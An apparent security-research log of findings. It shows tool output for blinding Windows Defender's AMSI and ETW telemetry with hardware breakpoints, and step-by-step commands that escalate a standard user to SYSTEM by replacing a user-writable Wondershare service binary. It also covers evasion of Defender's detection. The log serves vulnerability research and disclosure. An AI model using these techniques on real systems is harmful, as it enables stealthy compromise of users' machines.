ENGAGEMENTS 7-9 // FINDINGS #31-#37

the dark room

Defender has two user-mode telemetry gates: AMSI (script content scanning) and ETW (process event tracing). Both can be bypassed. But HOW you bypass them matters. The classic approach — VirtualProtect + patch bytes — gets caught immediately. Defender has specific behavioral signatures for exactly this pattern.

.\amsi_bypass.exe --patch [!] Process killed by Defender [!] Detection: Behavior:Win32/AMSI_Patch_T.B12 [!] Binary quarantined retroactively (Trojan:Win32/Bearfoos.B!ml) # VirtualProtect on amsi.dll = instant behavioral detection. # Defender watches for EXACTLY this: memory permission change # on AMSI code region followed by write. Specific rule. Named rule. # The binary survived static analysis (XOR-encoded strings) but # the ACT of patching is what triggers the kill.

So I stopped trying to patch memory. Instead: hardware breakpoints. CPU debug registers (DR0-DR3) intercept function execution at the hardware level. No VirtualProtect. No memory writes. Zero bytes modified in amsi.dll. Defender's tamper protection monitors memory — not CPU registers.

.\amsi_bypass_hwbp.exe Phase 1: amsi.dll loaded at 0x00007FFD6E8F0000 Phase 1: AmsiScanBuffer at 0x00007FFD6E8F8160 Phase 2: DR0 = 0x00007FFD6E8F8160 (execution breakpoint) Phase 2: DR7 = 0x00000401 (local DR0 enable, exec, 1-byte) Phase 2: VEH handler registered Phase 3: calling AmsiScanBuffer... Phase 3: result = 0x80070057 (E_INVALIDARG) Phase 3: AMSI BYPASSED -- function never executed Defender detection: NONE Binary quarantined: NO Memory modified: 0 bytes VirtualProtect calls: 0

Same technique applied to ETW. EtwEventWrite in ntdll — same hardware breakpoint approach, same result. Dead man test confirmed: called EtwEventWrite with a garbage handle (0xDEADBEEF). Normal execution would error. With the breakpoint active, it returned STATUS_SUCCESS — proof the function body never ran.

.\dark_room.exe PHASE 1: LOCATE AmsiScanBuffer at 0x00007FFD6E8F8160 EtwEventWrite at 0x00007FFD917E0430 PHASE 2: ACTIVATE DR0 = AmsiScanBuffer (AMSI blind) OK DR1 = EtwEventWrite (ETW blind) OK DR7 = 0x00000405 (dual exec BP) OK VEH unified handler registered OK PHASE 3: VERIFY AMSI: 0x80070057 E_INVALIDARG BLIND ETW: 0x00000000 STATUS_SUCCESS BLIND DARK ROOM OPERATIONAL All user-mode telemetry defeated. 0 bytes modified. 0 VirtualProtect calls. Defender detection: NONE

CONFIRMED MSRC POTENTIAL Finding #36: Defender's tamper protection has a systemic blind spot. It monitors memory integrity but not CPU debug register state. SetThreadContext on your own thread is a standard API — there is no behavioral rule for it. Two independent bypasses (AMSI, ETW) using the same architectural gap.

ENGAGEMENT 10 // FINDINGS #38-#43

standard user to SYSTEM

Automated service scanner enumerated 308 SYSTEM services. One flagged immediately: Wondershare NativePushService. Runs as LocalSystem. Binary lives in a per-user AppData directory. The directory AND the binary have BUILTIN\Users Full Control. Any standard user on the machine can replace the exe.

powershell -ep bypass .\hunter.ps1 | findstr CRITICAL [CRITICAL] NativePushService (LocalSystem, Auto) Binary: C:\Users\apacw\AppData\Local\Wondershare\...\WsNativePushService.exe Directory ACL: BUILTIN\Users:(OI)(CI)(F) -- FULL CONTROL Binary ACL: BUILTIN\Users:(I)(F) -- FULL CONTROL (inherited) # A LocalSystem service with its binary writable by standard users. # CWE-732: Incorrect Permission Assignment for Critical Resource. # The irony: Wondershare hardened against DLL sideloading with an # embedded manifest that locks all DLL loads to System32. They # hardened the windows but left the front door open.

First attempt was DLL sideloading — VERSION.dll proxy, six iterations of Defender evasion (plaintext → XOR → lazy-init). The v6 stealth proxy evaded Defender's ML completely. But the service never loaded it. Extracted the PE manifest: every non-KnownDLL import is hardcoded to System32 via <file> redirection. DLL search order is overridden.

So I went simpler. If you can't plant a DLL next to the exe, just replace the exe. Windows allows renaming open/locked files. Renamed the running service binary, dropped my replacement. Next restart: SCM loads our code as LocalSystem.

# Step 1: rename the running service exe (standard user, no elevation) ren "...\WsNativePushService.exe" "WsNativePushService_real.exe" Success. # Step 2: plant replacement copy svc_replace.exe "...\WsNativePushService.exe" 1 file(s) copied. # Step 3: service restarts (reboot or admin restart) # Step 4: check proof-of-execution type C:\Windows\Temp\ws_diag.log 20260615_033636|SYSTEM|elev=1|pid=34776|BINARY_REPLACE ^^^^^^ ^^^^^^ NT AUTHORITY\SYSTEM. Full token. Elevated. No admin creds entered. No UAC prompt.

SYSTEM CONFIRMED Finding #42: Standard user to LocalSystem via service binary replacement. CVSS 7.8 (High). CWE-732. The replacement binary launches the real service exe for continuity — service keeps running, nobody notices. Attack complexity: LOW. Privileges required: LOW (standard user). User interaction: NONE (auto-start on reboot).

Every defense layer tested: File ACL — broken. Directory ACL — broken. UAC — not triggered (AppData, not Program Files). Code signing — SCM doesn't verify. Manifest hardening — irrelevant (binary replaced, no DLL loading). Defender static — clean (our binary is a legitimate service exe). Defender behavioral — clean.
